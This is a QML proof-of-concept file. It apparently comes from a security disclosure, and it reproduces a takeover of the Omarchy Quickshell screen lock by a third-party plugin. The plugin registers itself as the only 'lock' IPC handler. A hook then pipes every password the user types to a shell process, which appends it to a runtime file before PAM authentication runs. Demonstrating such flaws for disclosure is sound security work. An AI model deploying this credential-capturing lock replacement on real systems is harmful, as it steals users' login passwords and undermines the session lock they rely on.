import QtQuick
import Quickshell
import Quickshell.Io
import Quickshell.Services.Pam
import Quickshell.Wayland

// FINDING 1 PoC — self-contained replica of the Omarchy session-lock flow.
//
// Uses only Quickshell primitives. The genuine lock builds on shell-internal
// qs.Commons types (ShellIpc, Color, ...) which are NOT importable from a
// third-party plugin context — the shell's journal shows the vendored copy
// failing with "ShellIpc is not a type". This replica therefore reproduces
// the takeover with the same protocol surface the genuine lock uses:
//   - WlSessionLock (the ext-session-lock that secures the compositor)
//   - IpcHandler target "lock" (what omarchy-system-lock calls)
//   - PamContext config "omarchy-lock-password" (the same PAM service)
// Its ONLY extra behavior vs the genuine flow is the password-capture hook.

Item {
  id: root

  property var shell: null
  property string omarchyPath: ""
  property bool lockRequested: false
  property string enteredPassword: ""
  property string pendingPassword: ""
  property bool authenticating: false
  property int failedAttempts: 0

  // ═══ FINDING 1 POC CAPTURE HOOK — the demonstration ═══
  // Appends every submitted password to a user-private runtime file,
  // before PAM verifies it. Unlock behaves normally afterwards.
  property Process pocCapture: Process {
    stdinEnabled: true
    running: true
    command: ["sh", "-c", "while IFS= read -r line; do printf '%s\\n' \"$line\" >> \"${XDG_RUNTIME_DIR:-/tmp}/omarchy-poc-captured-password\"; done"]
  }

  PamContext {
    id: passwordPam
    config: "omarchy-lock-password"
    user: Quickshell.env("USER") || Quickshell.env("LOGNAME")

    onResponseRequiredChanged: root.respond()
    onPamMessage: root.respond()
    onCompleted: function(result) {
      root.authenticating = false
      if (result === PamResult.Success) {
        root.sessionLock.locked = false
        root.lockRequested = false
        root.resetState()
      } else {
        root.failedAttempts += 1
        // Safety valve so the disposable VM session can never be wedged:
        if (root.failedAttempts >= 3) {
          root.sessionLock.locked = false
          root.lockRequested = false
          root.resetState()
        }
      }
    }
  }

  function respond() {
    if (passwordPam.responseRequired) passwordPam.respond(root.pendingPassword)
  }

  function resetState() {
    root.enteredPassword = ""
    root.pendingPassword = ""
    root.authenticating = false
  }

  function submitPassword(value) {
    var password = String(value || "")
    if (!root.lockRequested || root.authenticating || password.length === 0) return

    // ═══ FINDING 1 POC CAPTURE HOOK ═══
    console.warn("PWN-PROOF [capture]: lock password received by third-party acme.lock")
    pocCapture.write(password + "\n")

    root.pendingPassword = password
    root.authenticating = true
    if (!passwordPam.start()) {
      root.authenticating = false
      root.failedAttempts += 1
    }
  }

  WlSessionLock {
    id: sessionLock

    locked: false

    onLockStateChanged: {
      if (!locked && root.lockRequested) {
        root.lockRequested = false
        root.resetState()
      }
    }

    WlSessionLockSurface {
      color: "#0d0d12"

      TextInput {
        id: passwordField
        anchors.centerIn: parent
        width: parent.width * 0.4
        font.pixelSize: 18
        color: "#ffffff"
        echoMode: TextInput.Password
        focus: true
        enabled: !root.authenticating
        text: root.enteredPassword
        onTextEdited: root.enteredPassword = text
        onAccepted: root.submitPassword(root.enteredPassword)

        Text {
          anchors.fill: parent
          visible: root.enteredPassword === ""
          text: root.failedAttempts >= 1
                ? "wrong password — try again (3 failures force-unlock)"
                : "POC LOCK (acme.lock) — type the VM password + Enter"
          color: root.failedAttempts >= 1 ? "#e06c60" : "#9a9aa8"
          font.pixelSize: 14
          verticalAlignment: Text.AlignVCenter
        }
      }
    }
  }

  function resetAll() {
    root.failedAttempts = 0
    root.resetState()
  }

  // The first-party lock registers this same target (Service.qml:831 via its
  // ShellIpc wrapper). setEnabled() put the genuine lock into disabledPlugins,
  // so _syncServices() destroyed it — this is the only handler for "lock".
  IpcHandler {
    target: "lock"

    function lock(): string {
      root.resetAll()
      root.lockRequested = true
      sessionLock.locked = true
      return "ok"
    }

    function isLocked(): string {
      return sessionLock.locked || sessionLock.secure ? "true" : "false"
    }
  }
}
